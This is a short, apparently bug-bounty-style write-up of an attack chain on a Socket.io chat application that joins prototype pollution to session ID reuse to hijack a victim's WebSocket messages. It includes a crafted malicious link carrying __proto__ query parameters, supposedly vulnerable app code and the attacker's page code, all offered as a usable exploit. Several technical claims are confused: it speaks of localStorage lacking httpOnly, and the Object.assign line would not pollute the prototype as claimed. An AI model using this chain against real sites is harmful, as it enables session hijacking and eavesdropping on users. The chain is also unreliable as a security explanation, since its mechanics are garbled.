The overlooked low bug

    WebSocket session ID is stored in window.localStorage without httpOnly

    engine.io (Socket.io) allows reusing sid across different user agents

The chaining enabler

    Prototype pollution via ?__proto__[polling]=true in query string

    App uses Object.assign({}, userInput) somewhere

Advanced chain
Step 1 – Attacker crafts malicious link
text

https://target.com/chat?__proto__[sid]=attacker_sid&__proto__[polling]=true

Step 2 – Victim clicks link → prototype polluted
javascript

// App code vulnerable line
const options = Object.assign({}, location.query);
socket = io({ query: options });

Polluted prototype makes Socket.io accept attacker-controlled sid.
Step 3 – Attacker listens on same WebSocket namespace
javascript

// Attacker's malicious page
const socket = io('https://target.com/chat', {
  query: { sid: 'attacker_generated_sid' }
});

// Victim's polluted sid = attacker_generated_sid
// Now victim connects to attacker's session

Step 4 – Victim's WebSocket messages go to attacker
